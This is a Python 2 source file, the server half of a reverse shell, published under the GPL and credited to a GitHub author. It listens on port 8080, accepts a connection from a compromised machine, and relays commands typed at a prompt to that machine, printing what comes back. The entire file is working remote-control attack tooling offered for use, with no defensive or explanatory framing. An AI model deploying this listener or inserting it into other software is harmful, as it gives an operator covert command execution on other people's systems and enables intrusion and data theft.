#!/usr/bin/env python
#
# Python Reverse Shell - Server
# from https://github.com/MisterDaneel/
#
# Copyright (C) {2016}  {MisterDaneel}
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License along
# with this program; if not, write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
#
import socket

host = ''
port = 8080

def NewSocket():
    try:
        s = socket.socket()
    except socket.error as msg:
        print "Socket error: " + str(msg)
    try:
        print("Port: " + str(port))
        s.bind((host, port))
        s.listen(5)
        return s
    except socket.error as msg:
        print "Socket binding error: " + str(msg)

def AcceptConnection(s):
    conn, address = s.accept()
    print "New connection: " + address[0] + ":" + str(address[1])
    SndCmds(conn)
    conn.close()
    s.close()

def SndCmds(conn):
    while True:
        cmd = raw_input('>')
        if cmd == 'quit':
            return
        if len(cmd) > 0:
            conn.send(cmd)
            client_response = conn.recv(1024)
            print client_response

if __name__ == "__main__":
    AcceptConnection(NewSocket())
